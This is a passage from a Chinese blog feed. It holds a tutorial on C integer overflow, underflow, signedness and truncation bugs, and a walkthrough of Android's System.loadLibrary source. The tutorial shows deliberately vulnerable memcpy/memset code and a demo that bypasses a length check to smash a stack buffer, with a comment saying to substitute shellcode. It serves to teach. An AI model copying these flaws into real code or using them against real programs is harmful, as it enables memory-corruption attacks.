</span><br><span class="line">        </span><br><span class="line">getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上表中，会把输入的InputTest传给无符号短整型OutputTest。无符号的16位整数（2个字节）可以表示0~2^16 -1，也就是0xFFFF</p><p><strong>运行结果：</strong></p><p><img src="https://github.com/CytQ/BlogImgs/blob/master/Integer_Overflow/application.png?raw=true" alt="https://github.com/CytQ/BlogImgs/blob/master/Integer_Overflow/application.png?raw=true"></p><p>从上面可以发现，如果输入的值为0~65535，显示是没有问题的。如果超过了65535（比如65536），那么返回的结果是0，65537结果是1。</p><p><strong>老规矩，拖入ida pro动态分析</strong></p><p>给scanf下断点，可以看到，值最终存放在ecx寄存器中。</p><p><img src="https://github.com/CytQ/BlogImgs/blob/master/Integer_Overflow/65535.png?raw=true" alt="https://github.com/CytQ/BlogImgs/blob/master/Integer_Overflow/65535.png?raw=true"></p><p>如果我们输入65535，也就是0xFFFF.</p><p>如果输入65536，结果是0x10000</p><p><img src="https://github.com/CytQ/BlogImgs/blob/master/Integer_Overflow/65536.png?raw=true" alt="https://github.com/CytQ/BlogImgs/blob/master/Integer_Overflow/65536.png?raw=true"></p><p>接下来的步骤是：OutputTest = InputTest，对应的汇编为：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">dx</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>], <span class="built_in">dx</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_8]</span><br><span class="line"><span class="keyword">and</span> <span class="built_in">eax</span>, <span class="number">0FFFFh</span></span><br></pre></td></tr></table></figure><p>也就是将0018FF44这个地址的数值赋给eax，并做与操作.这样就完全剔除了高16位，只保留低16位的数值。</p><p>这也是为什么输入65536后数值会从0重新开始增加。</p><h2 id="无符号整数的上溢和下溢"><a href="#无符号整数的上溢和下溢" class="headerlink" title="无符号整数的上溢和下溢"></a>无符号整数的上溢和下溢</h2><p>负数 = 负数的补码 = 负数的反码 + 1</p><p>E.G: -1 可以表示为 100000001，取反 111111110，再加1，也就是111111111</p><p>对于无符号的整数，-1 = 0xFFFFFFFF</p><p><strong>常见的问题：</strong></p><blockquote><p>void <em>memcpy(void </em>dest, const void *src, size_t n)：从源src所指的内存地址的起始位置开始拷贝n个字节到目标dest所指的内存地址的起始位置中</p><p>void <em>memset(void </em>s, int ch, <a href="https://baike.baidu.com/item/size_t" target="_blank" rel="noopener">size_t</a> n)：将s中当前位置后面的n个字节 （typedef unsigned int size_t ）用 ch 替换并返回 s 。</p></blockquote><p><strong>下溢：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">fun</span><span class="params">(<span class="keyword">size_t</span> cbSize)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">if</span>( cbSize &gt; <span class="number">1024</span> )    </span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="keyword">return</span> FALSE;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">char</span> *pBuf = <span class="keyword">new</span> <span class="keyword">char</span>[cbSize<span class="number">-1</span>];    </span><br><span class="line">    <span class="comment">// 存在溢出隐患    </span></span><br><span class="line">    <span class="built_in">memset</span>(pBuf, <span class="number">0x90</span>, cbSize<span class="number">-1</span>);    </span><br><span class="line">    ...    </span><br><span class="line">    <span class="keyword">return</span> TRUE;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cbsize = 0，那么memset的第三个参数就为-1，而第三个参数为无符号整数，因此数据为0xFFFFFFFF，空间超过可执行的范围，因此崩溃。</p><p><strong>上溢：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">fun</span><span class="params">(<span class="keyword">char</span> *s1, <span class="keyword">size_t</span> len1, <span class="keyword">char</span> *s2, <span class="keyword">size_t</span> len2)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">if</span>(len1 + len2 + <span class="number">1</span> &gt; <span class="number">1024</span>)    </span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="keyword">return</span> FALSE;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">char</span> pBuf = <span class="keyword">new</span> <span class="keyword">char</span>[len1 + len2 + <span class="number">1</span>];    </span><br><span class="line">    <span class="keyword">if</span>(pBuf == <span class="literal">NULL</span>)    </span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="keyword">return</span> FALSE;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="built_in">memcpy</span>(pBuf, s1, len1);    </span><br><span class="line">    <span class="comment">// 存在溢出隐患    </span></span><br><span class="line">    <span class="built_in">memcpy</span>(pBuf + len1, s2, len2);    </span><br><span class="line">    ...    </span><br><span class="line">    <span class="keyword">return</span> TRUE;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>len1和len2都是无符号整数，如果len1=8，len2=0xFFFFFFFF，那么对于len1+len2+1这个运算来说，len2+1会变成0，然后再加上8，那么它的结果就是8。也就是说，new可能只分配了8个字节的空间，但是却要将长为0xFFFFFFFF的字符串复制到这个空间，那么结果就会造成程序的崩溃。</p><h2 id="有符号整数"><a href="#有符号整数" class="headerlink" title="有符号整数"></a>有符号整数</h2><ul><li>有符号整数之间的比较。</li><li>有符号整数的运算。</li><li>无符号整数和有符号整数的对比。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_something</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> len)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">char</span> szBuf[<span class="number">800</span>];    </span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="keyword">sizeof</span>(szBuf))    </span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="comment">// 存在溢出隐患    </span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>(szBuf, buf, len);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码的问题同样出在memcpy函数的第三个参数。由于memcpy使用的是无符号整数作为第三个参数的，但是最初的len是有符号整数。假设我们赋予len一个负值，那么就一定能够通过if语句的检测，但是当这个负值被运用在memcpy函数中时，len就可能变成一个非常大的正数，导致缓冲区及其后面的内容被改写，使得程序崩溃。</p><h2 id="截断问题"><a href="#截断问题" class="headerlink" title="截断问题"></a>截断问题</h2><p>截断问题主要发生在高位数的整数（如32位）复制到低位数的整数（如16位）的时候，发生的溢出现象</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">fun</span><span class="params">(byte *name, DWORD cbBuf)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> cbCalculatedBufSize = cbBuf;    </span><br><span class="line">    byte *buf = <span class="keyword">new</span> byte(cbCalculatedBufSize);    </span><br><span class="line">    <span class="keyword">if</span>(buf == <span class="literal">NULL</span>)    </span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="keyword">return</span> FALSE;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="comment">// 存在溢出隐患    </span></span><br><span class="line">    <span class="built_in">memcpy</span>(buf, name, cbBuf);    </span><br><span class="line">    ...    </span><br><span class="line">    <span class="keyword">return</span> TRUE;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 对于fun函数来说，如果它的第二个参数cbBuf的值为0x00010020，由于cbCalculatedBufSize只能接收16位的内容，那么在赋值后，该变量的值为0x0020，因此new仅仅分配了0x20这么多的字节，但是name的大小实际为0x00010020，这就造成了缓冲区溢出情况的出现。</p><h2 id="使用整数溢出实现栈溢出"><a href="#使用整数溢出实现栈溢出" class="headerlink" title="使用整数溢出实现栈溢出"></a>使用整数溢出实现栈溢出</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"string.h"</span>    </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdlib.h"</span> </span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">char</span> overflow[] =    </span><br><span class="line">    <span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"</span>    </span><br><span class="line">    <span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span>    </span><br><span class="line">    <span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68"</span>;    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> i)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="comment">// i是一个32位整数，s为16位。</span></span><br><span class="line">  <span class="comment">// 如果i = 65536,那么s = 0  </span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> s;    </span><br><span class="line">    <span class="keyword">char</span> szBuf[<span class="number">8</span>];    </span><br><span class="line">    s = i;    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 判断s是否大于8，我们原本输入的是65536，不合法，但截取低16位后为0，成功绕过</span></span><br><span class="line">    <span class="keyword">if</span>(s &gt; <span class="number">8</span>)    </span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(i &gt; <span class="keyword">sizeof</span>(overflow))    </span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="built_in">memcpy</span>(szBuf, overflow, <span class="keyword">sizeof</span>(overflow));    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">else</span>    </span><br><span class="line">    &#123;    </span><br><span class="line">      <span class="comment">// memcpy是个不安全函数</span></span><br><span class="line">        <span class="comment">// 只有8字节的空间塞进去了65536个字节，栈溢出</span></span><br><span class="line">      <span class="comment">// overflow设置为我们编写好的shellcode即可</span></span><br><span class="line">        <span class="built_in">memcpy</span>(szBuf, overflow, i);    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;    </span><br><span class="line">&#125;    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">int</span> i, ret;       </span><br><span class="line">    i = <span class="number">65536</span>;    </span><br><span class="line">    ret = fun(i);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/ioio_jy/article/details/50576353" target="_blank" rel="noopener">https://blog.csdn.net/ioio_jy/article/details/50576353</a></p>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;无符号整数&lt;/li&gt;
&lt;li&gt;有符号整数&lt;/li&gt;
&lt;li&gt;截断&lt;/li&gt;
&lt;li&gt;配合不安全函数进行栈溢出&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>System.loadLibrary() 做的事情</title>
    <link href="http://imlzq.com/2018/03/18/Jni_load/"/>
    <id>http://imlzq.com/2018/03/18/Jni_load/</id>
    <published>2018-03-18T05:05:36.000Z</published>
    <updated>2018-04-08T07:27:01.997Z</updated>
    
    <content type="html"><![CDATA[<p>本文源码摘自 android-6.0.0_r24分支</p><p>主要内容为梳理Android调用 System.loadLibrary()加载so库时的调用链</p> <a id="more"></a>   <h1 id="总括"><a href="#总括" class="headerlink" title="总括"></a>总括</h1><p>在能找到ClassLoader的情况下调用的顺序为：</p><ul><li>System.loadLibrary</li><li>Runtime.getRuntime().loadLibrary</li><li>构建本地文件系统和应用的库路径（在安装时，PMS会读取libs目录下的so文件，进行本地释放解压到指定目录）。拼接so的全称，匹配搜索so的全路径并返回</li><li>Runtime.getRuntime().doLoad()：获取从当前加载的Classloader获取LD_LIBRARY_PATH路径，传入底层的nativeLoad</li><li>获取虚拟机对象并调用其内部的LoadNativeLibrary方法。</li><li>判断目标库是否已加载。如果已加载，判断加载的ClassLoader和本次的ClassLoader是否相同，如果不同，则警告。如果未加载，使用dlopen打开并加载目标库的本进程的虚拟地址空间中，返回handle句柄。如果打开失败（handle为null），使用nativeBridge做二次尝试加载（会有是否支持nativeBridge加载的判断）。</li><li>如果两次加载都失败，直接返回。</li><li>如果加载成功，开始创建一个共享库对象。因为是多线程，所以在创建完成后需要判断是否有其他线程先于我们加载完成。如果是，则释放本次的资源。否，则使用dlsym获取JNI_OnLoad的地址。</li><li>如果目标库不存在JNI_OnLoad，返回false</li><li>如果存在，则调用并执行JNI_OnLoad-&gt;RegisterNatives-&gt;dvmRegisterJNIMethod-&gt;dvmUseJNIBridge.也就是说上层调用RegisterNatives，传入一个gMethods方法数组，注册的具体实现由各个VM自己实现。在Dalvik中，会遍历gMethod，将每个方法都存储到DalvikBridge中，也就完成了这个方法的注册。这里的Bridge其实是处理多平台的情况。比如so是面向多个平台的，每个平台都针对so有一套解析，比如参数的处理、栈架构的虚拟机、寄存器架构的虚拟机等，所以每个平台都自行封装一个Bridge，实现必要的方法，从而与上下层链接起来。</li></ul><h1 id="System-loadLibrary-load"><a href="#System-loadLibrary-load" class="headerlink" title="System.loadLibrary\load"></a>System.loadLibrary\load</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * See &#123;<span class="doctag">@link</span> Runtime#load&#125;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">load</span><span class="params">(String pathName)</span> </span>&#123;</span><br><span class="line">    Runtime.getRuntime().load(pathName, VMStack.getCallingClassLoader());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * See &#123;<span class="doctag">@link</span> Runtime#loadLibrary&#125;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loadLibrary</span><span class="params">(String libName)</span> </span>&#123;</span><br><span class="line">    Runtime.getRuntime().loadLibrary(libName, VMStack.getCallingClassLoader());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先分析loadLibrary.</p><p>这里会跟着调用Runtime的loadLibrary方法，传入两个值，一个是当前的so名称，一个是调用的ClassLoader。</p><ul><li>这里的so名称是不含”lib”前缀和”.so”后缀的。例如，要加载libtest.so，那么这里的libName应该为test</li><li>VMStack.getCallingClassLoader()这里其实就是获取可以加载该so的ClassLoader，说白了这里就是双亲委派模式。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">VMStack</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the defining class loader of the caller's caller.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the requested class loader, or &#123;<span class="doctag">@code</span> null&#125; if this is the</span></span><br><span class="line"><span class="comment">     *         bootstrap class loader.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">native</span> <span class="keyword">public</span> <span class="keyword">static</span> ClassLoader <span class="title">getCallingClassLoader</span><span class="params">()</span></span>;</span><br><span class="line">.....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RunTime"><a href="#RunTime" class="headerlink" title="RunTime"></a>RunTime</h2><p>这里先提一下RunTime这个类。它的作用是将Java应用与它们正在运行的环境连接起来。这是个单例类，也就是说在Android中同一时间只能存在一个Runtime，每个应用获得的都是它的实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Allows Java applications to interface with the environment in which they are</span></span><br><span class="line"><span class="comment"> * running. Applications can not create an instance of this class, but they can</span></span><br><span class="line"><span class="comment"> * get a singleton instance by invoking &#123;<span class="doctag">@link</span> #getRuntime()&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> System</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Runtime</span> </span>&#123;</span><br></pre></td></tr></table></figure><p>下图为它内部的函数结构</p><p><img src="https://github.com/CytQ/BlogImgs/blob/master/Jni_load/RunTime_functions.png?raw=true" alt="RunTime_Detail"></p><p>它包含的功能其实也就是执行command、库相关的管理、系统资源信息的获取（如堆中可用内存、总共内存、堆最大可拓展到多少内存）等等。说白了就是一个桥接的作用，里面封了一堆方法用于上层快速调用或者获取系统调用、资源情况等。</p><h2 id="RunTime-getRuntime-loadLibrary"><a href="#RunTime-getRuntime-loadLibrary" class="headerlink" title="RunTime.getRuntime().loadLibrary"></a>RunTime.getRuntime().loadLibrary</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Searches for and loads the given shared library using the given ClassLoader.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">loadLibrary</span><span class="params">(String libraryName, ClassLoader loader)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (loader != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 返回的filename是目标库的全路径。</span></span><br><span class="line">            <span class="comment">// 此时的名字已经做好拼接.如/com/example/test/libtest.so</span></span><br><span class="line">            String filename = loader.findLibrary(libraryName);</span><br><span class="line">            <span class="keyword">if</span> (filename == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// It's not necessarily true that the ClassLoader used</span></span><br><span class="line">                <span class="comment">// System.mapLibraryName, but the default setup does, and it's</span></span><br><span class="line">                <span class="comment">// misleading to say we didn't find "libMyLibrary.so" when we</span></span><br><span class="line">                <span class="comment">// actually searched for "liblibMyLibrary.so.so".</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> UnsatisfiedLinkError(loader + <span class="string">" couldn't find \""</span> +</span><br><span class="line">                                               System.mapLibraryName(libraryName) + <span class="string">"\""</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            String error = doLoad(filename, loader);</span><br><span class="line">            <span class="keyword">if</span> (error != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> UnsatisfiedLinkError(error);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String filename = System.mapLibraryName(libraryName);</span><br><span class="line">        List&lt;String&gt; candidates = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        String lastError = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (String directory : mLibPaths) &#123;</span><br><span class="line">            String candidate = directory + filename;</span><br><span class="line">            candidates.add(candidate);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (IoUtils.canOpenReadOnly(candidate)) &#123;</span><br><span class="line">                String error = doLoad(candidate, loader);</span><br><span class="line">                <span class="keyword">if</span> (error == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span>; <span class="comment">// We successfully loaded the library. Job done.</span></span><br><span class="line">                &#125;</span><br><span class="line">                lastError = error;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (lastError != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnsatisfiedLinkError(lastError);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsatisfiedLinkError(<span class="string">"Library "</span> + libraryName + <span class="string">" not found; tried "</span> + candidates);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>接着看loadLibrary。</p><p>这里有个分叉，也就是传入的ClassLoader是否为空。</p><p>双亲委派模式也就是一层一层的往父类找，让父类先尝试加载，避免出现多个本质相同但加载器不同的字节码。</p><p><strong>先看loader != null的情况：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String filename = loader.findLibrary(libraryName);</span><br></pre></td></tr></table></figure><p>首先，去获取so的文件名，也就是对so名做拼装。上面提到的libtest.so，传入test，返回就是完整的名字。</p><p>之所以会有这么一步，是因为在不同平台下，test的拼装结果不一样，所以最好的方式就是上层应用方只需传入名称，前缀跟后缀由各个平台自动补齐。</p><p>在Android中，Classloader分两种:</p><ul><li>一种是DexClassloader，用于在app的路径下加载jar包或者apk中相关的资源。</li><li>一种是PathClassloader，用于加载本地文件系统路径下的资源</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A class loader that loads classes from &#123;<span class="doctag">@code</span> .jar&#125; and &#123;<span class="doctag">@code</span> .apk&#125; files</span></span><br><span class="line"><span class="comment"> * containing a &#123;<span class="doctag">@code</span> classes.dex&#125; entry. This can be used to execute code not</span></span><br><span class="line"><span class="comment"> * installed as part of an application.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;This class loader requires an application-private, writable directory to</span></span><br><span class="line"><span class="comment"> * cache optimized classes. Use &#123;<span class="doctag">@code</span> Context.getCodeCacheDir()&#125; to create</span></span><br><span class="line"><span class="comment"> * such a directory: &lt;pre&gt;   &#123;<span class="doctag">@code</span></span></span><br><span class="line"><span class="comment"> *   File dexOutputDir = context.getCodeCacheDir();</span></span><br><span class="line"><span class="comment"> * &#125;&lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;strong&gt;Do not cache optimized classes on external storage.&lt;/strong&gt;</span></span><br><span class="line"><span class="comment"> * External storage does not provide access controls necessary to protect your</span></span><br><span class="line"><span class="comment"> * application from code injection attacks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DexClassLoader</span> <span class="keyword">extends</span> <span class="title">BaseDexClassLoader</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Provides a simple &#123;<span class="doctag">@link</span> ClassLoader&#125; implementation that operates on a list</span></span><br><span class="line"><span class="comment"> * of files and directories in the local file system, but does not attempt to</span></span><br><span class="line"><span class="comment"> * load classes from the network. Android uses this class for its system class</span></span><br><span class="line"><span class="comment"> * loader and for its application class loader(s).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PathClassLoader</span> <span class="keyword">extends</span> <span class="title">BaseDexClassLoader</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它们都属于BaseDexClassLoader的子类，也就是说双亲委派加载类时都会让BaseDexClassLoader尝试加载。</p><p>而我们的findLibrary，就属于BaseDexClassLoader的内部方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">findLibrary</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> pathList.findLibrary(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>这里的pathList又是什么呢？</strong></p><p>其实就是一个用于管理dex、resource、本地库路径的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 